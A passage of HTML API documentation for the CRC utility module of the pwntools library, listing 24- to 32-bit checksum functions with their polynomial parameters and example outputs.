<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.24">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.24</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_24</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">2215682</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_24_ble">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_24_ble</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_24_ble" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_24_ble checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x65b</li>
<li>width   = 24</li>
<li>init    = 0x555555</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-24-ble">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-24-ble</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_24_ble</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">12737110</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_24_flexray_a">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_24_flexray_a</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_24_flexray_a" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_24_flexray_a checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x5d6dcb</li>
<li>width   = 24</li>
<li>init    = 0xfedcba</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-24-flexray-a">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-24-flexray-a</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_24_flexray_a</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">7961021</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_24_flexray_b">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_24_flexray_b</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_24_flexray_b" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_24_flexray_b checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x5d6dcb</li>
<li>width   = 24</li>
<li>init    = 0xabcdef</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-24-flexray-b">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-24-flexray-b</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_24_flexray_b</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">2040760</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_24_interlaken">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_24_interlaken</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_24_interlaken" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_24_interlaken checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x328b63</li>
<li>width   = 24</li>
<li>init    = 0xffffff</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0xffffff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-24-interlaken">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-24-interlaken</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_24_interlaken</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">11858918</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_24_lte_a">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_24_lte_a</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_24_lte_a" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_24_lte_a checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x864cfb</li>
<li>width   = 24</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-24-lte-a">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-24-lte-a</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_24_lte_a</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">13494019</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_24_lte_b">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_24_lte_b</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_24_lte_b" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_24_lte_b checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x800063</li>
<li>width   = 24</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-24-lte-b">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-24-lte-b</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_24_lte_b</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">2355026</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_30_cdma">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_30_cdma</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_30_cdma" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_30_cdma checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x2030b9c7</li>
<li>width   = 30</li>
<li>init    = 0x3fffffff</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x3fffffff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.30">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.30</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_30_cdma</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">79907519</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_31_philips">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_31_philips</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_31_philips" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_31_philips checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x4c11db7</li>
<li>width   = 31</li>
<li>init    = 0x7fffffff</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x7fffffff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.31">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.31</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_31_philips</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">216654956</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_32">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_32</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_32" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_32 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x4c11db7</li>
<li>width   = 32</li>
<li>init    = 0xffffffff</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0xffffffff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.32">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.32</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_32</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">3421780262</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_32_autosar">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_32_autosar</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_32_autosar" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_32_autosar checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0xf4acfb13</li>
<li>width   = 32</li>
<li>init    = 0xffffffff</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0xffffffff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-32-autosar">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-32-autosar</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_32_autosar</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">379048042</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_32_bzip2">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_32_bzip2</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_32_bzip2" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_32_bzip2 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x4c11db7</li>
<li>width   = 32</li>
<li>init    = 0xffffffff</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0xffffffff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-32-bzip2">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-32-bzip2</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_32_bzip2</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">4236843288</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_32_mpeg_2">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_32_mpeg_2</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_32_mpeg_2" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_32_mpeg_2 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x4c11db7</li>
<li>width   = 32</li>
<li>init    = 0xffffffff</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-32-mpeg-2">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-32-mpeg-2</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_32_mpeg_2</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">58124007</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_32_posix">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_32_posix</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_32_posix" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_32_posix checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x4c11db7</li>
<li>width   = 32</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0xffffffff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-32-posix">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-32-posix</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_32_posix</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">1985902208</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_32c">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_32c</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_32c" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_32c checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x1edc6f41</li>
<li>width   = 32</li>
<li>init    = 0xffffffff</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0xffffffff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-32c">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-32c</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_32c</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">3808858755</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_32d">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_32d</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_32d" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_32d checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0xa833982b</li>
<li>width   = 32</li>
<li>init    = 0xffffffff</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0xffffffff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-32d">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-32d</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_32d</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">2268157302</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_32q">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_32q</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_32q" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_32q checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x814141ab</li>
<li>width   = 32</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-32q">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-32q</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
